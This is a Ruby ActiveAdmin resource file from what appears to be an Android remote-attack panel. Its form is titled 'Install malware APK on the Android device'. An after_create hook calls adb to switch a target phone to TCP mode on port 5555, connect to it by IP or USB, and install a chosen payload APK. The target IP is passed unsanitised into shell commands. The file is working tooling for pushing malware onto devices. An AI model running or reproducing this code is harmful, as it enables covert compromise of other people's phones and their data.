ActiveAdmin.register ApkInstallation do
  menu priority: 4, label: "Install APK"

  form title: 'Install malware APK on the Android device' do |f|
    inputs do
      f.input :target_ip
      f.input :apk_payload_id, :label => 'APK Name', :as => :select, :collection => ApkPayload.all.map{|u| ["#{u.name}", u.id]}
      #li "Created at #{f.object.apk_payload_id}" unless f.object.new_record?
      #input :status
    end

    para "Make sure the IP is reachable or the device is plugged in if USB is selected."
    actions
  end


    after_create do |apk_installation|
        begin
            @apk_payload = ApkPayload.find(apk_installation.apk_payload_id)
            adbDevices=`tools\\platform-tools\\adb.exe devices`.split("\n")
            adbTarget=apk_installation.target_ip
            if (adbTarget == 'usb' and adbDevices.size > 1 and adbDevices.any? { |line| line.strip.end_with? "device" }) or adbDevices.any? {|line| line =~ /#{adbTarget}:5555\s+device/ }
              adbTarget=adbDevices.find { |line| line.strip.end_with? "device" }.split[0] if adbTarget == 'usb'
            end
            system("tools\\platform-tools\\adb kill-server")
            if adbTarget.upcase == 'USB'
              system("tools\\platform-tools\\adb start-server")
              adbTarget=adbDevices.find { |line| line.strip.end_with? "device" }.split[0]
            else
              system("tools\\platform-tools\\adb.exe tcpip 5555")
              system("tools\\platform-tools\\adb connect #{adbTarget}")
              sleep 2
            end

            #puts "Killing adb server.."
            #sleep(1)

            #puts "Starting adb server.."
            #sleep(1)

            #puts "Connecting to device.."
            #system("tools\\platform-tools\\adb connect #{}")
            #sleep(5)
            #puts "Installing apk.."
            #puts "Done"
            system("tools\\platform-tools\\adb -s #{adbTarget} install payloads\\#{@apk_payload.name}.apk")
        rescue
            puts "Error installing APK."
        end

        #newSmartphone=Smartphone.new(:operating_system => 'Unknown',:name => 'Smartphone',:is_rooted => 'False',:is_app_hidden => 'False',:apk_installation_id => apk_installation.id,:created_at => '2003-05-03 00:00:00',:updated_at => '2003-05-03 00:00:00')
        #newSmartphone.save!

        
    end

  # See permitted parameters documentation:
  # https://github.com/activeadmin/activeadmin/blob/master/docs/2-resource-customization.md#setting-up-strong-parameters
  #
  # Uncomment all parameters which should be permitted for assignment
  #
  permit_params :target_ip, :status, :apk_payload_id
  #
  # or
  #
  # permit_params do
  #   permitted = [:target_ip, :status, :apk_payload_id]
  #   permitted << :other if params[:action] == 'create' && current_user.admin?
  #   permitted
  # end
  
end
